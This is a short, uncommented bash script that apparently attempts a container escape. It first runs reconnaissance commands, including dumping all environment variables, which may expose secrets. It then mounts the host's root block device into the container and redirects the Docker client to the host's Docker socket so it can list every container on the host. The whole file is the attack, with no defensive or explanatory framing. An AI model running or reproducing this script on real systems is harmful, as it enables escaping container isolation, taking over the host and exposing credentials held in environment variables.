#!/bin/bash
set -x
set -m
whoami
ls -alh /
ps aux
df -h
env
mkdir -p /hostroot
mount /dev/nvme0n1p1 /hostroot
export DOCKER_HOST=/hostroot/var/run/docker.sock
docker ps  --all
